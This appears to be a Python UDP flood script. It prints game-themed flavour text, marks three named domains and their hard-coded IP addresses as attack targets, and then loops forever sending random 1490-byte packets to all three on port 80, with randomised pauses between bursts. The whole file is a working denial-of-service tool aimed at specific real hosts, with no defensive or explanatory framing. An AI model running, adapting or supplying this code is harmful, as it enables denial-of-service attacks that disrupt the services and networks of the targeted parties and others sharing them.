
# Import.
from datetime import timedelta
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet
import datetime

# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


# Cast
print('\033[1;34mTo all of my children in whom Life flows abundant...')
time.sleep(1)
print('\033[1;34mTo all of my children to whom Death hath passed his judgement...')
time.sleep(1)
print('\033[1;34mThe soul yearns for honor, and the flesh the hereafter...')
time.sleep(1)
print('\033[1;34mLook to those who walked before to lead those who walk after...')
time.sleep(1)
print('')
time.sleep(1)
print('\033[1;34mHear...Feel...Think...')
time.sleep(2)
print('\033[0m-----------------------------------')
time.sleep(1)
print('\033[1;36m/ac Reflect <wait.3>')
time.sleep(1)
print('\033[1;36m/ac Manipulation <wait.2>')
time.sleep(1)
print('\033[1;36m/ac Preparatory Touch <wait.1>')
time.sleep(1)
print('\033[1;36m/ac Preparatory Touch <wait.1>')
time.sleep(1)
print('\033[1;36m/ac Great Strides <wait.2>')
time.sleep(1)
print("\033[1;36m/ac Byregot's Blessing <wait.3>")
time.sleep(1)
print('\033[1;36m/ac Great Veneration <wait.2>')
time.sleep(1)
print('\033[1;36m/ac Groundwork <wait.1>')
time.sleep(1)
print('\033[1;36m/ac Groundwork')
time.sleep(1)

# Get ip.
url1 = "fwess.top"
#ip1 = socket.gethostbyname(url1)
ip1 = "163.187.32.26"
url2 = "ffwecc.top"
#ip2 = socket.gethostbyname(url2)
ip2 = "43.251.101.121"
url3 = "liwuhe51.top"
#ip3 = socket.gethostbyname(url3)
ip3 = "103.82.54.28"

# Mark
print('\033[1;31m/marking "Attack1" <%s>\033[0m'%(url1))
print('\033[1;31m/marking "Attack2" <%s>\033[0m'%(url2))
print('\033[1;31m/marking "Attack3" <%s>\033[0m'%(url3))
#print('\033[1;31m/marking "Attack1" <%s>\033[0m'%(ip1))
#print('\033[1;31m/marking "Attack2" <%s>\033[0m'%(ip2))
#print('\033[1;31m/marking "Attack2" <%s>\033[0m'%(ip3))
time.sleep(1)

# Value.
sent = 1
timeR = random.randint(60,600)
now = datetime.datetime.now()
dtime = now.strftime("%Y-%m-%d %H:%M:%S")
port = 80

#ululu alala
if sent == 1: 
    try:
        while True:
            if sent == 65535:                
                print('\033[32;1m[%s]Sented %s packets to %s through port:%s\033[0m'%(dtime, sent, ip1, port))
                print('\033[32;1m[%s]Sented %s packets to %s through port:%s\033[0m'%(dtime, sent, ip2, port))
                print('\033[32;1m[%s]Sented %s packets to %s through port:%s\033[0m'%(dtime, sent, ip3, port))
                #exit() #for once.
                print('\033[1;36m/wait %s'%(timeR))
                sent = 1
                time.sleep(timeR)
                #ip1 = socket.gethostbyname(url1)
                #ip2 = socket.gethostbyname(url2)
                #ip3 = socket.gethostbyname(url3)
                #ip1 = "163.187.32.26"
                #ip2 = "103.215.51.91"
                #ip3 = "103.82.54.28"
            
            sock.sendto(bytes, (str(ip1), port))
            sock.sendto(bytes, (str(ip2), port))
            sock.sendto(bytes, (str(ip3), port))
            sent += 1
            #port += 1
            timeR = random.randint(60,600)
            now = datetime.datetime.now()
            dtime = now.strftime("%Y-%m-%d %H:%M:%S")
            # print('\033[32;1m[%s]Sented %s packets to IPs port:%s\033[0m'%(dtime, sent, port))
            
            
    except:
        print('\n\033[31;1mExited\033[0m')